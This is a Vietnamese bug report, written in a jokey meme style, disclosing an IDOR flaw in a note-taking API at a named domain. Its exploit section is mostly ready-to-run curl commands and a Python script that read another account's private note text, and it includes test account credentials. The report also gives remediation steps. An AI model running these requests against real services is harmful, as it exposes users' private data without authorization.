# BÁO CÁO LỖ HỔNG IDOR - THINKFLOW API

## Thông tin cơ bản
- **Ngày phát hiện:** 19/04/2025
- **Mức độ nghiêm trọng:** CAO VÃI NỒIIIII
- **API bị ảnh hưởng:** https://api.carehub-us.click

## Mô tả lỗ hổng
API cho phép người dùng truy cập nội dung ghi chú của người dùng khác thông qua endpoint `/note/v1/texts/{id}` mà không kiểm tra quyền sở hữu. Đây là một lỗ hổng IDOR nghiêm trọng vl nhé!

![Security Facepalm](https://i.imgur.com/iWKad22.jpg)

## Bằng chứng khai thác (đơn giản như ăn kẹo)
1. Tạo 2 tài khoản riêng biệt:
```bash
# Tài khoản 1 - Kẻ ngây thơ vô số tội
curl -X POST https://api.carehub-us.click/auth/v1/register -H "Content-Type: application/json" \
  -d '{"email":"nihey85233@cotigz.com","password":"Tempemail@123","first_name":"dkr8s","last_name":"j3rh4"}'

# Tài khoản 2 - Hacker mũ đen
curl -X POST https://api.carehub-us.click/auth/v1/register -H "Content-Type: application/json" \
  -d '{"email":"cimos69472@cxnlab.com","password":"Hackpass2@123","first_name":"r9dkf","last_name":"j38k9"}'
```

2. Tạo ghi chú với nội dung bí mật bằng tài khoản 1:
```bash
# Đăng nhập tài khoản 1 - "Đây là bí mật của tôi hehe"
TOKEN1=$(curl -s -X POST https://api.carehub-us.click/auth/v1/authenticate -H "Content-Type: application/json" \
  -d '{"email":"nihey85233@cotigz.com","password":"Tempemail@123"}' | grep -o 'accessToken=[^;]*' | cut -d= -f2)

# Tạo ghi chú bí mật như kiểu "Ai mà đọc được cái này chắc phải hack NASA"
NOTE_ID=$(curl -s -X POST https://api.carehub-us.click/note/v1/notes -H "Content-Type: application/json" \
  -H "Cookie: accessToken=$TOKEN1" -d '{"title":"Secret Note!"}' | grep -o '"data":"[^"]*"' | cut -d'"' -f4)

# Thêm nội dung bí mật - "Để tao cất kĩ vào đây"
TEXT_ID=$(curl -s -X POST "https://api.carehub-us.click/note/v1/texts/note/$NOTE_ID" -H "Content-Type: application/json" \
  -H "Cookie: accessToken=$TOKEN1" -d '{"text_content":"This is a secret data that should not be accessible to others."}' | grep -o '"data":"[^"]*"' | cut -d'"' -f4)

echo "Tạo ghi chú với ID: $NOTE_ID và nội dung ID: $TEXT_ID"
```

3. Đánh cắp dữ liệu bằng tài khoản 2:
```bash
# Đăng nhập tài khoản 2 - "Để xem họ có gì hay ho..."
TOKEN2=$(curl -s -X POST https://api.carehub-us.click/auth/v1/authenticate -H "Content-Type: application/json" \
  -d '{"email":"cimos69472@cxnlab.com","password":"Hackpass2@123"}' | grep -o 'accessToken=[^;]*' | cut -d= -f2)

# Thử truy cập ghi chú của tài khoản 1 qua ID note (API: "Không được đâu nhóc")
curl -X GET "https://api.carehub-us.click/note/v1/notes/ECVMjHZqgvfAj3n" -H "Cookie: accessToken=$TOKEN2"
# Kết quả: {"code":403,"status":"Forbidden","message":"no permission, only note owner or collaborator can do this"}

# Khai thác IDOR - Đọc nội dung ghi chú của tài khoản 1 qua ID văn bản (API: "Ồ, mời vào đọc thoải mái")
curl -X GET "https://api.carehub-us.click/note/v1/texts/DT1HKzkDNAUtYL6" -H "Cookie: accessToken=$TOKEN2"
# Kết quả: {"data":{"id":"...","text_content":"This is a secret data that should not be accessible to others."}}
```

![Hackerman](https://i.kym-cdn.com/entries/icons/original/000/021/807/ig9OoyenpxqdCQyABmOQBZDI0duHk2QZZmWg2Hxd4ro.jpg)

## Script siêu lầy để hack một phát ăn ngay
```python
import requests

# Thông tin tài khoản - "Danh sách nạn nhân"
user1 = {"email": "nihey85233@cotigz.com", "password": "Tempemail@123"}
user2 = {"email": "cimos69472@cxnlab.com", "password": "Hackpass2@123"}

# Đăng nhập vào cả hai tài khoản - "Vào vai diễn thôi"
def login(user):
    r = requests.post("https://api.carehub-us.click/auth/v1/authenticate", json=user)
    return r.cookies.get("accessToken")

token1 = login(user1)  # "Token của người vô tội"
token2 = login(user2)  # "Token của kẻ xấu"

# Trình diễn lỗ hổng IDOR - "Dễ như ăn kẹo"
def exploit_idor(text_id, token):
    headers = {"Cookie": f"accessToken={token}"}
    r = requests.get(f"https://api.carehub-us.click/note/v1/texts/{text_id}", headers=headers)
    return r.json()

# Text ID của tài khoản 1 - "Chìa khóa vào kho báu"
text_id = "DT1HKzkDNAUtYL6"

# Khai thác từ tài khoản 2 - "Và giờ là thời khắc huyền diệu..."
result = exploit_idor(text_id, token2)
print(f"HACK THÀNH CÔNG! Đọc được nội dung riêng tư: {result['data']['text_content']}")
print("Backend developer be like: 'WHY ARE YOU RUNNING???'")
```

## Tác động
- Kẻ tấn công có thể đọc **TẤT CẢ** ghi chú riêng tư của người dùng khác
- Các thông tin nhạy cảm có thể bị lộ, bao gồm dữ liệu cá nhân, tài chính, mật khẩu, thông tin kinh doanh...
- Vi phạm nghiêm trọng về quyền riêng tư của người dùng
- Backend developers sẽ khóc thét khi biết chuyện này

> Dev khi thấy báo cáo lỗi: "Ơ mẹ ơi, quên check quyền rồi!!!"

## Cách khắc phục (Fix gấp nếu không muốn bay job)
1. Thêm kiểm tra quyền sở hữu trong endpoint `/note/v1/texts/{id}` tương tự như đã làm với endpoint `/note/v1/notes/{id}`
2. Thực hiện xác thực người dùng ở tất cả các API endpoints - "Không xác thực = Mời hacker vào nhà"
3. Sử dụng UUID ngẫu nhiên thay vì ID dự đoán được - "Đoán mò ID dễ hơn cả đoán tỉ số bóng đá"

![Fix It Now](https://i.imgflip.com/7rftcu.jpg)

## Kết luận
Lỗ hổng IDOR này nghiêm trọng tới mức dev đọc xong báo cáo có khi phải xin nghỉ phép 1 tuần để hoàn hồn. Khách hàng cần khắc phục ngay nếu không muốn thấy dữ liệu của mình xuất hiện trên dark web với giá 2 đô la.

> "API bảo mật là gì? Ở đây chúng tôi không biết điều đó" - ThinkFlow API, 2025 
